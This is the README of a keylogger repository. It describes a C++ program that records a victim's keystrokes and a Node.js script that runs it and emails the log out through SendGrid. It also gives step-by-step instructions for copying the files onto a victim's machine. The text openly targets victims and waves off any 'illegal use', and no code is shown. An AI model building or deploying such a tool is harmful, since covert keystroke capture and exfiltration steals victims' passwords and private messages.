# ⌨️ keyLogger-Tool
This tool will help you to mointer keystores of your victim and send you the log file via email

# ⭐ About :
1. The keylogger is created using c++ which will track your keyboard strokes and write it to log.txt file.
2. The app.js is a nodejs file which will compile the c++ file and will run the file for certain amount of time and mail the log.txt file to user. 

# 📝 note : 
This version requires victim to already have nodeJs and Mingw compiler already installed and PATH variables declared!!
The next version of code will contain more features stay tuned.

# 💾 guide :
1. set-Up your sendGrid mail and just pust your key and mails in app.js.
2. open powershell.
3. run command "./dumpScript.bat" , with this your files are copied to C drive of victim. 
4. Put the sendGrid APIKEY and your emails at the placeholder in app.js.
5. run command "app.js".
6. congratulations !!. Your keylogger has started and now you will recieve the mails.

!! this code only works for single startUp session once the computer is shutdown you need to restart the app.js code.

# 👮‍♂️Terms and Conditions
When you clone this repo or download this repo , toastsandwich will not be reponsible if you use this for any legal or illegal use.
